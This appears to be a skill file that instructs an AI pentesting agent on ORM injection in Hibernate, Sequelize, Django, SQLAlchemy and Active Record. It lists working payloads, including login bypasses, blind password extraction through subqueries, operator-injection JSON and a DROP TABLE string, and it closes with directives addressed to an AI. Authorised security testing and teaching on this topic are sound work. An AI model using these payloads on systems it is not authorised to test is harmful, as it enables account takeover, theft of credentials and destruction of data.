# ORM Injection Skill

## Goal

Identify and exploit ORM (Object-Relational Mapping) injection vulnerabilities to bypass security controls or extract data.

## Methodology

1. **Identify ORM Usage:** Detect ORM frameworks (Hibernate, Sequelize, Django ORM, SQLAlchemy)
2. **Test Query Parameters:** Find parameters that accept objects or operators
3. **Inject ORM Operators:** Use framework-specific injection techniques
4. **Bypass Filters:** Exploit ORM-specific query building behavior
5. **Extract Data:** Use relationships and eager loading to access related data

## HQL/JPQL Injection (Java/Hibernate)

```java
# Basic injection (if string concatenation is used)
' OR '1'='1'--
' OR 1=1--

# Function abuse
admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--

# Subquery injection
admin' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')>0--
```

## Sequelize Injection (Node.js)

```javascript
// Operator injection via JSON
// Vulnerable: User.findOne({where: req.body})
// Attack: {"username": {"$ne": ""}, "password": {"$ne": ""}}

// Column injection
{"username": ["admin", "administrator"], "password": {"$gt": ""}}

// Raw query injection (if raw: true is used)
{"$or": [{"username": "admin"}, {"username": {"$like": "%"}}]}
```

## Django ORM Injection

```python
# Lookup injection (if unsanitized kwargs)
# Vulnerable: User.objects.filter(**request.GET)
# Attack: ?username=admin&password__startswith=a

# Extra/raw injection
?search='; DROP TABLE users;--
```

## SQLAlchemy Injection

```python
# Text clause injection
# Vulnerable: session.query(User).filter(text(user_input))
admin' OR '1'='1

# Column injection in order_by
# Vulnerable: query.order_by(user_input)
(SELECT password FROM users LIMIT 1)
```

## Active Record Injection (Ruby)

```ruby
# Condition injection
# Vulnerable: User.where("username = '#{params[:user]}'")
admin'--
' OR 1=1--

# Array condition bypass
# Vulnerable: User.where(username: params[:user])
# Attack: ?user[]=admin&user[]=anything  # Uses IN clause
```

## Common Vulnerable Patterns

```
# Direct input to where/filter
Model.find({where: userInput})
Model.objects.filter(**userInput)
session.query(Model).filter(text(input))

# Order by injection
Model.order(userInput)
query.order_by(column(input))
```

## Tools

* **SQLMap** - Works on some ORM-generated queries
* **Burp Suite** - Manual testing with JSON payloads
* **Framework-specific scanners**

## Guidance for AI

* Activate when testing applications using ORM frameworks
* Look for JSON/object parameters that might be passed to query methods
* Test operator injection (`$ne`, `$gt`, `$like`) for Node.js/Sequelize
* For Django, try lookup operators like `__startswith`, `__contains`
* HQL/JPQL is similar to SQL but uses entity names instead of tables
* Check if raw/text queries are built with concatenation
* ORM injection often bypasses parameterized query protections
